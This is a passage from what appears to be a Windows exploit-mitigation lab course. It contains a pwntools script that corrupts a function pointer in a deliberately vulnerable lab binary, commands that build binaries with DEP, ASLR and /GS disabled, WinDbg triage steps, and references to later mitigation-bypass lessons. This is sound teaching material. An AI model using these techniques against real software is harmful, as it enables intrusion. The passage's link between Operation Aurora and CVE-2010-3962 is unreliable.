context.log_level = 'info'

# Choose target binary
target = sys.argv[1] if len(sys.argv) > 1 else 'cfg_test.exe'
target_path = rf'C:\Windows_Mitigations_Lab\bin\{target}'

log.info(f"Target: {target}")

# The vulnerable suite's 'funcptr' mode tests function pointer corruption
io = process([target_path, 'funcptr'])

# Read initial output with timeout
try:
    # Read until we see the prompt for address input
    output = io.recvuntil(b"Enter new function address", timeout=5)
    log.info("Got function pointer test output")
except:
    log.error("Timeout waiting for funcptr prompt")
    io.close()
    sys.exit(1)

# Try to redirect to an invalid address (simulating heap corruption)
# In a real exploit, this might point to shellcode or a ROP gadget
bad_target = 0xdeadbeefcafe

log.info(f"Attempting to redirect function pointer to: {hex(bad_target)}")
io.sendline(hex(bad_target).encode())

# Wait for process to handle the call and crash/exit
try:
    io.wait(timeout=5)
except:
    pass

if io.returncode is None:
    log.warning("Process still running - unexpected")
    io.close()
else:
    exit_code = io.returncode & 0xFFFFFFFF
    log.info(f"Process exited with code: {hex(exit_code)}")

    if exit_code == 0x80000003:  # STATUS_BREAKPOINT (__fastfail via int 0x29)
        log.success(f"CFG validation failed! Call to {hex(bad_target)} blocked")
        log.info("CFG checked the bitmap, rejected invalid target, called __fastfail()")
        log.info("NOTE: __fastfail raises int 0x29 -> process exit = 0x80000003")
        log.info("      WinDbg exception record still shows 0xC0000409 subcode 10")
    elif exit_code == 0xc0000409:  # STATUS_STACK_BUFFER_OVERRUN
        log.success(f"/GS cookie caught the overflow BEFORE CFG checked the call")
        log.info("/GS uses __fastfail(2) but exit code differs from CFG's __fastfail(10)")
    elif exit_code == 0xc0000005:  # STATUS_ACCESS_VIOLATION
        log.warning(f"Access Violation - call to {hex(bad_target)} attempted")
        log.info("CFG was NOT active - call went through but crashed at bad address")
    else:
        log.info(f"Check Windows NTSTATUS codes for {hex(exit_code)}")
```

**Expected Results**:

```bash
# Against cfg_test.exe (with CFG) - call blocked!
python exploits\week5_cfg_test.py cfg_test.exe
#[*] Target: cfg_test.exe
#[*] Got function pointer test output
#[*] Attempting to redirect function pointer to: 0xdeadbeefcafe
#[*] Process exited with code: 0x80000003
#[+] CFG validation failed! Call to 0xdeadbeefcafe blocked
#[*] CFG checked the bitmap, rejected invalid target, called __fastfail()
#[*] NOTE: __fastfail raises int 0x29 -> process exit = 0x80000003
#[*]       WinDbg exception record still shows 0xC0000409 subcode 10

# Against no_cfg_test.exe (without CFG) - crashes at call
python exploits\week5_cfg_test.py no_cfg_test.exe
#[*] Target: no_cfg_test.exe
#[*] Got function pointer test output
#[*] Attempting to redirect function pointer to: 0xdeadbeefcafe
#[*] Process exited with code: 0xc0000005
#[!] Access Violation - call to 0xdeadbeefcafe attempted
#[*] CFG was NOT active - call went through but crashed at bad address
```

| Target            | Exit Code    | What Happened                                                            |
| ----------------- | ------------ | ------------------------------------------------------------------------ |
| `cfg_test.exe`    | `0x80000003` | CFG intercepted the call, checked bitmap, `__fastfail(10)` -> `int 0x29` |
| `no_cfg_test.exe` | `0xc0000005` | No CFG - call executed, jumped to `0xdeadbeefcafe`, crashed              |

**Document**: "CFG validates indirect calls against a bitmap of valid targets. Even with a write primitive to corrupt function pointers, calls to arbitrary addresses are blocked."

#### Step 5: Full Mitigation Stack

| Mitigation    | Enable Via                          | Works In Any VM |
| ------------- | ----------------------------------- | --------------- |
| DEP           | `/NXCOMPAT` (linker) or system-wide | Yes             |
| ASLR          | `/DYNAMICBASE` (linker)             | Yes             |
| High Entropy  | `/HIGHENTROPYVA` (linker)           | Yes             |
| Stack Cookies | `/GS` (compiler, default)           | Yes             |
| CFG           | `/guard:cf` (compiler+linker)       | Yes             |
| XFG           | OS-level (via `/guard:cf` metadata) | Yes             |
| SEHOP         | System default (x86)                | Yes             |
| SafeSEH       | `/SAFESEH` (x86 only)               | Yes             |

**Track A Setup** (works everywhere):

```bash
# Compile a fully-protected binary (Track A mitigations) using the standardized suite
cl /GS /guard:cf /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\full_protect_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA /guard:cf

# Verify all protections:
dumpbin /headers /loadconfig bin\full_protect_test.exe | findstr "NX Dynamic High Guard"
# Expected: NX compatible, Dynamic base, High Entropy, Guard CF instrumented

# Test: all Week 5 exploits should fail against this binary
python exploits\week5_aslr_test.py full_protect_test.exe   # Fails: /GS catches overflow first!
python exploits\week5_gs_test.py full_protect_test.exe     # Fails: /GS detects cookie corruption
python exploits\week5_cfg_test.py full_protect_test.exe    # Fails: CFG blocks bad call targets
```

**Test Results:**

```bash
c:\Windows_Mitigations_Lab>python exploits\week5_aslr_test.py full_protect_test.exe
#[*] Target: full_protect_test.exe
#[*] Stack leak:  0xf2801efca0           <- ASLR randomized
#[*] Process exited with code: 0xc0000409
#[-] /GS cookie triggered - exploit FAILED

c:\Windows_Mitigations_Lab>python exploits\week5_gs_test.py full_protect_test.exe
#[*] Sending 150 bytes to overflow 64-byte buffer
#[*] Process exited with code: 0xc0000409
#[+] Stack buffer overrun detected! (/GS protection triggered)

c:\Windows_Mitigations_Lab>python exploits\week5_cfg_test.py full_protect_test.exe
#[*] Attempting to redirect function pointer to: 0xdeadbeefcafe
#[*] Process exited with code: 0x80000003
#[+] CFG validation failed! Call to 0xdeadbeefcafe blocked
```

| Exploit              | Attack Vector    | Stopped By                     | Exit Code    |
| -------------------- | ---------------- | ------------------------------ | ------------ |
| `week5_aslr_test.py` | ROP chain        | /GS (overflow corrupts cookie) | `0xc0000409` |
| `week5_gs_test.py`   | Stack overflow   | /GS (cookie check)             | `0xc0000409` |
| `week5_cfg_test.py`  | Function pointer | CFG (bitmap check)             | `0x80000003` |

> [!NOTE]
> **Defense in Depth**: The ROP exploit was stopped by /GS, not ASLR! The stack overflow
> corrupted the cookie before the corrupted return address was ever used. Multiple
> mitigations provide overlapping protection.

### Graduated Exercise Checklist

Before proceeding to Day 1's detailed content, complete these exercises:

- [ ] **Exercise G1**: DEP blocks shellcode execution
  - Run: `bin\dep_test.exe dep` -> Should crash with `0xc0000005` (execute violation)
- [ ] **Exercise G2**: ASLR breaks hardcoded ROP gadget addresses
  - Run: `python exploits\week5_aslr_test.py aslr_test.exe` -> Should fail with `0xc0000005`
  - Compare: `python exploits\check_aslr.py dep_test.exe` vs `python exploits\check_aslr.py aslr_test.exe`
- [ ] **Exercise G3**: /GS detects stack cookie corruption
  - Run: `python exploits\week5_gs_test.py gs_test.exe` -> Should fail with `0xc0000409`
  - Compare: `python exploits\week5_gs_test.py no_gs_test.exe` -> Should crash with `0xc0000005`
- [ ] **Exercise G4**: CFG blocks indirect calls to invalid targets
  - Run: `python exploits\week5_cfg_test.py cfg_test.exe` -> Should fail with `0x80000003` (NOT `0xc0000409`!)
  - Compare: `python exploits\week5_cfg_test.py no_cfg_test.exe` -> Should crash with `0xc0000005`
  - Note: CFG uses `__fastfail(10)` -> `int 0x29` -> exit code `0x80000003`, different from /GS!
- [ ] **Exercise G5**: Full protection blocks ALL exploit attempts
  - Run all three exploits against `full_protect_test.exe`
  - /GS exploits -> `0xc0000409`, CFG exploit -> `0x80000003` (different mitigations, different exit codes!)

**Completion Criteria**: You should be able to explain exactly why each of your Week 5 exploits fails against each mitigation level, and identify which mitigation caught the exploit by its exit code.

### Mitigation Interaction Matrix

| If Attacker Has...        | DEP Blocks | ASLR Blocks  | /GS Blocks | CFG Blocks |
| ------------------------- | ---------- | ------------ | ---------- | ---------- |
| Shellcode on stack        | +          | -            | -          | -          |
| Shellcode on heap         | +          | -            | -          | -          |
| Known libc address        | -          | +            | -          | -          |
| Stack overflow            | -          | -            | +          | -          |
| Heap overflow -> func ptr | -          | -            | -          | +          |
| ROP chain                 | -          | Partial      | -          | -          |
| Info leak                 | -          | Defeats ASLR | -          | -          |

### Crash Signature to Mitigation Mapping

**Bridge to Week 4 (Crash Analysis)**: When analyzing crashes, these signatures indicate which mitigation caused termination:

| Mitigation       | Process Exit Code | WinDbg Exception Code           | Key Indicators                                 | WinDbg Analysis                               | **Bypass in Week 8**                        |
| ---------------- | ----------------- | ------------------------------- | ---------------------------------------------- | --------------------------------------------- | ------------------------------------------- |
| **DEP**          | `0xC0000005`      | `0xC0000005` (Access Violation) | `EXCEPTION_PARAMETER1 = 8` (execute violation) | `!analyze -v` shows "DEP violation"           | **Task X: Userland Data-Only Attack**       |
| **/GS (Cookie)** | `0xC0000409`      | `0xC0000409` (subcode 2)        | Fast fail, process terminates immediately      | Bucket: `OVERRUN_STACK_BUFFER_*`              | **Day 3: Stack Cookie Bypass**              |
| **CFG**          | `0x80000003`      | `0xC0000409` (subcode 10)       | `FAST_FAIL_GUARD_ICALL_CHECK_FAILURE`          | Bucket: `FAIL_FAST_GUARD_ICALL_CHECK_FAILURE` | **Task X: Userland Data-Only Attack**       |
| **CET Shadow**   | `0x80000003`      | `0xC0000407`                    | `STATUS_CONTROL_STACK_VIOLATION`               | Shadow stack mismatch detected                | _Advanced: Data-Only or Race Conditions_    |
| **Heap Cookie**  | `0xC0000374`      | `0xC0000374` (Heap Corruption)  | Detected on HeapFree/HeapAlloc                 | `!heap -p -a <addr>` shows corruption         | **Day 5: Heap Exploitation (Safe-Linking)** |

> [!WARNING]
> **Exit Code vs Exception Code**: Python's `process.returncode`, `%ERRORLEVEL%`, and `echo $LASTEXITCODE`
> show the **process exit code**. WinDbg's `.exr -1` and `!analyze -v` show the **exception code**.
> CFG and CET both call `__fastfail()` which executes `int 0x29` -> process exits with `0x80000003`
> (STATUS_BREAKPOINT), but the exception record INSIDE WinDbg preserves the original status.

**Quick WinDbg Triage**:

```bash
# After crash, identify mitigation:
!analyze -v

# Check exception parameters for DEP:
.exr -1
# Parameter1: 0 = read, 1 = write, 8 = DEP (execute)

# For fast fail codes:
# Look in exception record for subcode
# 10 = CFG, 37 = CET shadow stack, etc.
```

### The "Mitigation Failure Card"

In previous weeks, you created "Crash Cards". In Week 6, you must complete a **Mitigation Failure Card** for every blocked exploit.

> **MITIGATION FAILURE CARD**
>
> **Exploit Attempted**: Stack Overflow (150 bytes into 64-byte buffer)
> **Target Binary**: `bin\gs_test.exe`
> **Crash Symptom**: Process terminated immediately, no shellcode execution
> **Exception Code**: `0xC0000409` (STATUS_STACK_BUFFER_OVERRUN)
> **Failure Subcode/Param**: Stack Cookie corruption detected
> **WinDbg Bucket**: `FAIL_FAST_STACK_BUFFER_OVERRUN`
> **Why it Failed**: The stack cookie (placed between buffer and return address) was corrupted by the overflow. `__security_check_cookie()` detected the mismatch and called `__fastfail()`.
> **Potential Bypass**: Info leak to read cookie value, then include correct cookie in payload. Or target a function without /GS protection.

### Data-Only Attack Mitigation Evasion

| Attack Type               | DEP Blocks | ASLR Blocks  | /GS Blocks | CFG Blocks |
| ------------------------- | ---------- | ------------ | ---------- | ---------- |
| Shellcode on stack        | +          | -            | -          | -          |
| Shellcode on heap         | +          | -            | -          | -          |
| Known libc address        | -          | +            | -          | -          |
| Stack overflow            | -          | -            | +          | -          |
| Heap overflow -> func ptr | -          | -            | -          | +          |
| ROP chain                 | -          | Partial      | -          | -          |
| Info leak                 | -          | Defeats ASLR | -          | -          |
| Data-Only Attack          | -          | -            | -          | -          |

**Why This Matters**: In real-world analysis, you often start with a crash dump. Knowing these signatures lets you immediately identify:

1. Whether exploitation was attempted
2. Which mitigation stopped it
3. What the attacker was trying to do

### Data Execution Prevention (DEP) / NX bit

**What is DEP?**:

- Marks memory pages as non-executable
- Prevents code execution on stack and heap
- Also called NX (No eXecute) on Linux, W^X elsewhere

**How DEP Works**:

```text
Without DEP:
Memory Page: Read + Write + Execute (RWX)
- Stack: RWX
- Heap: RWX
- Data: RWX
-> Shellcode anywhere can execute

With DEP:
Memory Page: Read + Write OR Execute (never both)
- Stack: RW (no execute)
- Heap: RW (no execute)
- .text section: RX (read + execute only)
- Data section: RW (no execute)
-> Shellcode on stack/heap cannot execute
```

**DEP Policies**:

```bash
# Run in powershell
switch ((Get-CimInstance Win32_OperatingSystem).DataExecutionPrevention_SupportPolicy) {
  0 { 'AlwaysOff' }
  1 { 'AlwaysOn' }
  2 { 'OptIn' }
  3 { 'OptOut' }
  default { 'Unknown' }
}
# Example output: OptIn
```

#### Deep Dive: DEP at the Hardware Level

**The NX Bit in Page Table Entries**:

Understanding DEP requires understanding how the CPU enforces it through page tables.

```text
x64 Page Table Entry (PTE) Structure:
┌────────────────────────────────────────────────────────────┐
│ 63│62-52│51-M│M-12│11-9│ 8 │ 7 │ 6 │ 5 │ 4 │ 3 │ 2 │ 1 │ 0 │
├───┼─────┼────┼────┼────┼───┼───┼───┼───┼───┼───┼───┼───┼───┤
│NX │Avail│Rsv │PFN │Avl │G  │PAT│D  │A  │PCD│PWT│U/S│R/W│P  │
└───┴─────┴────┴────┴────┴───┴───┴───┴───┴───┴───┴───┴───┴───┘

Key Bits:
- Bit 63 (NX): No-Execute bit
  - 0 = Page is executable
  - 1 = Page is NOT executable (DEP enforced)
- Bit 0 (P): Present bit
- Bit 1 (R/W): Read/Write permission
- Bit 2 (U/S): User/Supervisor (ring 3/ring 0)

DEP Enforcement:
1. CPU fetches instruction
2. MMU translates virtual -> physical address
3. MMU reads PTE for that page
4. If NX bit is SET and page is in data segment:
   -> #PF (Page Fault) with specific error code
   -> Windows converts to STATUS_ACCESS_VIOLATION
```

**Page Protection Constants**:

```c
// Windows memory protection constants (memoryapi.h)
#define PAGE_NOACCESS           0x01
#define PAGE_READONLY           0x02
#define PAGE_READWRITE          0x04
#define PAGE_WRITECOPY          0x08
#define PAGE_EXECUTE            0x10    // Rarely used alone
#define PAGE_EXECUTE_READ       0x20    // Code sections
#define PAGE_EXECUTE_READWRITE  0x40    // JIT, dangerous
#define PAGE_EXECUTE_WRITECOPY  0x80

// Relationship to NX bit:
// PAGE_READWRITE         -> NX bit SET (non-executable)
// PAGE_EXECUTE_READ      -> NX bit CLEAR (executable)
// PAGE_EXECUTE_READWRITE -> NX bit CLEAR (JIT requirement)
```

**WinDbg Lab: Examining Page Protections**:

```bash
# Step 1: Attach to a process
# start notepad, run windbg and attach to it

# Step 2: View all memory regions with protections
!address

# Sample output (truncated - full output shows all loaded modules):
#          BaseAddress      EndAddress+1        RegionSize     Type       State                 Protect             Usage
# --------------------------------------------------------------------------------------------------------------------------
# +        0`7ffe0000        0`7ffe1000        0`00001000 MEM_PRIVATE MEM_COMMIT  PAGE_READONLY                      Other      [User Shared Data]
# +       c1`902f9000       c1`90300000        0`00007000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Stack      [~0; 11f0.2bcc]
# +     7ff7`966d0000     7ff7`966d1000        0`00001000 MEM_IMAGE   MEM_COMMIT  PAGE_READONLY                      Image      [Notepad.exe]
# +     7ff7`966d1000     7ff7`96876000        0`001a5000 MEM_IMAGE   MEM_COMMIT  PAGE_EXECUTE_READ                  Image      [Notepad.exe]
#                                                                                 ↑ Code section     ↑ Stack - no execute
```

**Step 3: Examine Specific Memory Regions**

Test these addresses to understand DEP protection:

```bash
# Stack memory (where buffer overflows occur)
0:004> !vprot c1`902f9000
BaseAddress:       000000c1902f9000
AllocationBase:    000000c190200000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000000000007000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE    # ← NO EXECUTE - DEP protected!
Type:              00020000  MEM_PRIVATE

# Executable code section (.text)
0:004> !vprot 7ff7`966d1000
BaseAddress:       00007ff7966d1000
AllocationBase:    00007ff7966d0000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        00000000001a5000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ  # ← Executable but NOT writable
Type:              01000000  MEM_IMAGE

# Heap memory
0:004> !vprot 283`f5000000
BaseAddress:       00000283f5000000
AllocationBase:    00000283f5000000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000000000002000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE    # ← NO EXECUTE - DEP protected!
Type:              00020000  MEM_PRIVATE
```

**Step 4: Check Current Stack Pointer**

```bash
# Get current stack pointer
0:004> r rsp
rsp=000000c1906ffcb8

# Verify it's in non-executable memory
0:004> !vprot 000000c1906ffcb8
BaseAddress:       000000c1906ff000
AllocationBase:    000000c190600000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000000000001000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE    # ← Stack is NEVER executable
Type:              00020000  MEM_PRIVATE
```

**Summary Table - W^X (Write XOR Execute) in Action:**

| Region           | Address Example | Writable | Executable | Attack Vector?        |
| ---------------- | --------------- | :------: | :--------: | --------------------- |
| Stack            | `c1`902f9000`   |    +     |     -      | ROP gadgets only      |
| Code (.text)     | `7ff7`966d1000` |    -     |     +      | Source of ROP gadgets |
| PE Header        | `7ff7`966d0000` |    -     |     -      | None                  |
| Heap             | `283`f5000000`  |    +     |     -      | Data-only attacks     |
| User Shared Data | `7ffe0000`      |    -     |     -      | Info leak source      |

> [!IMPORTANT]
> **DEP Takeaway**: No memory region is both Writable AND Executable simultaneously.
> This is why classic shellcode injection fails and attackers must use ROP chains.

**Why Some Processes Need Executable Data**:

```text
Legitimate uses of PAGE_EXECUTE_READWRITE:
1. JIT Compilers (JavaScript V8, .NET CLR, Java HotSpot)
   - Generate code at runtime
   - Must write then execute

2. Self-modifying code (rare, legacy)

3. Packers/Protectors (unpack code into memory)

Modern JIT approach (W^X compliant):
1. Allocate PAGE_READWRITE
2. Write generated code
3. VirtualProtect -> PAGE_EXECUTE_READ
4. Execute
5. Never have RWX simultaneously

Browser sandboxes enforce this strictly:
- Chrome: renderer processes cannot create RWX memory
- ACG (Arbitrary Code Guard) blocks VirtualProtect to +X
```

**Per-Process DEP Configuration**:

```bash
# View DEP settings
Get-ProcessMitigation -System

# View for specific process
Get-Process notepad -ErrorAction SilentlyContinue | ForEach-Object { Get-ProcessMitigation -Id $_.Id }

# Set DEP for program
Set-ProcessMitigation -Name myapp.exe -Enable DEP, SEHOP
```

#### Testing DEP

**Testing DEP with the Unified Suite**:

We use the `vulnerable_suite_win_mitigated.c` from the start of this lab (see Line ~450). The suite's **Option 1 (Stack Overflow)** triggers the `vuln_stack()` function which attempts to execute shellcode placed on the stack—DEP should block this.

**Compile WITHOUT DEP** (for comparison):

```bash
# x64 Native Tools Command Prompt
cd C:\Windows_Mitigations_Lab

# Build WITHOUT DEP (NXCOMPAT:NO) - shellcode MAY execute
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\dep_test_disabled.exe /link /NXCOMPAT:NO /DYNAMICBASE:NO /FIXED

# Verify DEP is disabled:
dumpbin /headers bin\dep_test_disabled.exe | findstr "NX"
# Should NOT show "NX compatible"

# Run and select Option 1 (Stack Overflow)
.\bin\dep_test_disabled.exe stack
# Enter long input to trigger overflow - may crash differently without DEP
```

**Compile WITH DEP** (default, recommended):

```bash
# Build WITH DEP enabled (NXCOMPAT) but WITHOUT ASLR (to isolate DEP testing)
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\dep_test.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED

# Verify DEP is enabled:
dumpbin /headers bin\dep_test.exe | findstr "NX"
# Should show: "NX compatible"

# Run and select Option 1 (Stack Overflow)
.\bin\dep_test.exe stack
# When prompted, enter 100+ 'A' characters to overflow the buffer
# DEP will block execution of any shellcode on the stack
```

**Verify DEP in WinDbg**:

```bash
# Launch the DEP-enabled binary in WinDbg with 'stack' argument
windbg C:\Windows_Mitigations_Lab\bin\dep_test.exe stack

# Set breakpoint on vuln_stack function (will be deferred until module loads)
1:001> bp dep_test!vuln_stack
Bp expression 'dep_test!vuln_stack' could not be resolved, adding deferred bp
1:001> g

# When initial break hits, check stack page protections
0:000> !vprot @rsp
BaseAddress:       000000000014f000
AllocationBase:    0000000000050000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000000000001000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE   # <-- No EXECUTE permission!
Type:              00020000  MEM_PRIVATE

# Continue execution - the overflow will corrupt the return address
0:000> g
(13fc.634): Access violation - code c0000005 (first chance)
dep_test+0x1078:
00000001`40001078 c3              ret

# Analyze the crash
0:000> !analyze -v
EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Access violation
EXCEPTION_PARAMETER1:  0000000000000000  # 0 = Read, 1 = Write, 8 = DEP/Execute
EXCEPTION_PARAMETER2:  ffffffffffffffff  # Invalid address from corrupted return

# The stack shows the overflow pattern (0x61 = 'a', cyclic pattern)
STACK_TEXT:
00000000`0014fee8 61616174`61616173 : dep_test+0x1078  # Corrupted return address!
```

> [!NOTE]
> **Understanding the Crash**: This crash is a **read violation** (EXCEPTION_PARAMETER1=0) because the corrupted return address points to unmapped memory.
> If we had actual shellcode and the return address pointed to the stack, we would see EXCEPTION_PARAMETER1=**8** (DEP/execute violation).
> The key observation is that `!vprot @rsp` shows `PAGE_READWRITE` without execute permission—DEP is working!

### Address Space Layout Randomization (ASLR)

**What is ASLR?**:

- Randomizes base addresses of executables and DLLs
- Makes it hard to predict code/data locations
- Defeats hardcoded address exploitation
- Enabled by `/DYNAMICBASE` linker flag

**What ASLR Randomizes**:

- Executable base address (if /DYNAMICBASE)
- DLL base addresses
- Stack location
- Heap location
- PEB/TEB location

**ASLR Entropy** (Windows 11 x64):

> [!NOTE]
> Entropy values are **approximate** and vary by Windows build, configuration, and specific mitigation policies. Use these as rough guidelines for understanding the scale of randomization.

- Executables: ~17 bits (128K possibilities)
- DLLs: ~19 bits (512K possibilities)
- Stack: ~17 bits
- Heap: ~5 bits per allocation

#### Deep Dive: ASLR Implementation Internals

**How Windows Calculates Randomization**:

```text
ASLR Randomization Sources:
1. KeQueryPerformanceCounter() - high-resolution timer
2. Process creation time
3. System boot time (stored in SharedUserData)
4. Per-boot random seed (KeRandomSeed)

Formula (simplified):
ImageBase = PreferredBase + (RandomValue * AllocationGranularity)

Where:
- PreferredBase: From PE header (usually 0x140000000 for x64)
- RandomValue: Derived from entropy sources
- AllocationGranularity: 64KB (0x10000)
```

**ASLR Entropy Breakdown by Component**:

```text
Windows 11 x64 ASLR Entropy:
┌─────────────────────────────────────────────────────────────────┐
│ Component          │ Bits │ Possible Values │ Notes             │
├────────────────────┼──────┼─────────────────┼───────────────────┤
│ Executable (EXE)   │  17  │     131,072     │ /HIGHENTROPYVA    │
│ DLLs               │  19  │     524,288     │ Per-DLL random    │
│ Stack              │  17  │     131,072     │ Per-thread        │
│ Heap               │   5  │          32     │ Per-allocation    │
│ PEB/TEB            │   8  │         256     │ Process/thread    │
│ Kernel (KASLR)     │  24  │  16,777,216     │ At boot only      │
└─────────────────────────────────────────────────────────────────┘

x86 (32-bit) - Much less entropy:
┌─────────────────────────────────────────────────────────────────┐
│ Component          │ Bits │ Possible Values │ Notes             │
├────────────────────┼──────┼─────────────────┼───────────────────┤
│ Executable (EXE)   │   8  │         256     │ Limited by VA     │
│ DLLs               │   8  │         256     │ Brute-forceable   │
│ Stack              │  14  │      16,384     │ Better than EXE   │
│ Heap               │   5  │          32     │ Same as x64       │
└─────────────────────────────────────────────────────────────────┘
```

**High Entropy ASLR (/HIGHENTROPYVA)**:

```bash
# Check if binary uses high entropy ASLR
cd c:\Windows_Mitigations_Lab>
dumpbin /headers bin\aslr_test.exe|findstr "High Entropy"
# shows High Entropy Virtual Addresses
```

**WinDbg Lab: Observing ASLR Randomization**:

```bash
# IMPORTANT: ASLR Behavior is More Nuanced Than "Reboot-Only"
#
# ASLR uses a per-boot random seed for base address calculation.
# However, some module bases may appear stable within a boot session due to:
# - Shared DLL mappings across processes (performance optimization)
# - Kernel address space layout caching
# - ForceRelocateImages policy (can change this behavior)
#
# DO NOT rely on any predictable behavior for exploitation!
# Always measure empirically in your specific environment.

# Method 1: Compare module bases across reboots
# ---------------------------------------------
windbg notepad.exe
lm m ntdll
# Note ntdll base address (e.g., 0x7ffb12340000)

# Reboot VM and repeat
# ntdll base should be different (new per-boot seed)

# Method 2: Compare across process launches (within same boot)
# ------------------------------------------------------------
# NOTE: Behavior varies based on:
# - ForceRelocateImages policy (if enabled, more randomization)
# - Whether DLL is already mapped by another process
# - System configuration and Windows version

windbg notepad.exe
lm m notepad
# Note base

.restart
lm m notepad
# Base may or may not change - this is environment-dependent!

# Method 3: Force per-launch randomization (recommended for security)
# -------------------------------------------------------------------
Set-ProcessMitigation -Name notepad.exe -Enable ForceRelocateImages
# Now each launch should get a different EXE base

# To verify:
for /L %i in (1,1,5) do @powershell -c "(Get-Process notepad -ErrorAction SilentlyContinue).MainModule.BaseAddress"
```

**ASLR Weaknesses (Understanding Limitations)**:

```text
ASLR Limitation 1: Shared DLL Base Addresses
--------------------------------------------
Within a boot session, all processes share same DLL bases.
If attacker leaks ntdll.dll base from ANY process,
they know it for ALL processes until reboot.

ASLR Limitation 2: Information Leaks
------------------------------------
Any pointer disclosure defeats ASLR for that module:
- printf() with %p on user data
- Stack traces in error messages
- Uninitialized memory disclosure
- Side-channel attacks (cache timing)

ASLR Limitation 3: Partial Overwrites
-------------------------------------
If overflow only corrupts low bytes of pointer:
- High bytes stay randomized
- Low bytes can redirect within same page
- Example: Change function to different offset

ASLR Limitation 4: Low Entropy (32-bit)
---------------------------------------
8 bits = 256 possibilities
At 1000 attempts/second = ~4 minutes average
Remote attacks with reconnection can brute-force
```

**Testing ASLR with the Unified Suite**:

> [!NOTE]
> To observe ASLR in action, we'll use WinDbg to examine module base addresses. The `vulnerable_suite_win_mitigated.c` binary itself doesn't print addresses, but WinDbg's `lm` command shows where modules are loaded.

**Compile WITH ASLR** (recommended):

```bash
# x64 Native Tools Command Prompt
cd C:\Windows_Mitigations_Lab

# Build WITH ASLR (DYNAMICBASE) and High Entropy
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\aslr_test.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA

# Verify ASLR is enabled:
dumpbin /headers bin\aslr_test.exe | findstr "Dynamic base"
# Should show: "Dynamic base"

dumpbin /headers bin\aslr_test.exe | findstr "High Entropy"
# Should show: "High Entropy Virtual Addresses"
```

**Compile WITHOUT ASLR** (for comparison):

```bash
# Build WITHOUT ASLR (DYNAMICBASE:NO /FIXED)
cl /GS- /D_CRT_SECURE_NO_WARNINGS src\vulnerable_suite_win_mitigated.c /Fe:bin\no_aslr_test.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED

# Verify ASLR is disabled:
dumpbin /headers bin\no_aslr_test.exe | findstr "Dynamic base"
# Should NOT show "Dynamic base"
```

**Observe ASLR with WinDbg**:

```bash
# Launch the ASLR-enabled binary in WinDbg
windbg bin\aslr_test.exe stack

# In WinDbg, list loaded modules:
0:000> lm
# Note the base addresses for aslr_test and ntdll

# Close WinDbg and launch again:
windbg bin\aslr_test.exe stack
0:000> lm
# Within the same boot session, bases MAY be the same (Windows optimization)

# REBOOT the VM, then launch again:
windbg bin\aslr_test.exe stack
0:000> lm
# Now addresses should be different!

# Compare with NO-ASLR binary:
windbg bin\no_aslr_test.exe stack
0:000> lm
# Executable base is ALWAYS 0x140000000 (predictable!)
```

### Checking Mitigation Status

**Using Process Explorer**:

1. Download Process Explorer from Sysinternals
2. Run as Administrator
3. View -> Select Columns -> Process Image tab
4. Enable: ASLR Enabled, DEP Status
5. View running processes with protection status

**Using dumpbin**:

```bash
# Check PE headers
dumpbin /headers .\bin\aslr_test.exe | findstr "Dynamic base"
# "Dynamic base" present = ASLR enabled

dumpbin /headers .\bin\dep_test.exe | findstr "NX compatible"
# "NX compatible" present = DEP enabled
```

**Programmatic Detection**:

```c
// c:\Windows_Mitigations_Lab\src\mitigation.c
// compile with cl src\detection.c /Fe:bin\detection.exe /link
#include <windows.h>
#include <stdio.h>

void check_dep() {
    // Check hardware NX support
    if (IsProcessorFeaturePresent(PF_NX_ENABLED)) {
        printf("[+] Hardware DEP supported\n");
    }

    // Check if enabled for current process
    DWORD flags;
    BOOL permanent;
    if (GetProcessDEPPolicy(GetCurrentProcess(), &flags, &permanent)) {
        printf("[+] DEP enabled: %s\n", flags ? "Yes" : "No");
        printf("[+] Permanent: %s\n", permanent ? "Yes" : "No");
    }
}

void check_aslr() {
    HMODULE hExe = GetModuleHandle(NULL);
    printf("[*] Base address: %p\n", hExe);

    // Check if likely randomized
    // Non-randomized bases are often at 0x00400000 or similar
    if ((ULONG_PTR)hExe < 0x10000000) {
        printf("[-] Likely NOT randomized (low address)\n");
    } else {
        printf("[+] Likely randomized (high address)\n");
    }
}

int main() {
    printf("=== Mitigation Check ===\n\n");
    check_dep();
    printf("\n");
    check_aslr();
    return 0;
}
```

### CVE Case Studies: What DEP and ASLR Prevent

Understanding the historical attacks these mitigations stopped helps appreciate their value.

#### CVE-2008-4250: MS08-067 Conficker Worm (What DEP Prevents)

**The Attack (Pre-DEP era exploitation)**:

```text
Vulnerability: Stack buffer overflow in Server Service (netapi32.dll)
Target: Windows XP/2003 (many without DEP)
Impact: Remote code execution via SMB

Exploit Flow (without DEP):
1. Attacker sends malicious SMB request
2. Stack buffer overflow in svchost.exe
3. Return address overwritten -> points to stack
4. Shellcode on stack executes
5. Worm propagates to next target

Why DEP Would Block:
- Stack marked non-executable
- Return to stack shellcode fails
- Attack limited to DoS without ROP
```

**Lesson**: DEP would have significantly hindered Conficker's propagation.

#### CVE-2010-3962: IE Aurora Attack (What ASLR Prevents)

**The Attack (Operation Aurora)**:

```text
Vulnerability: Use-after-free in mshtml.dll (IE 6)
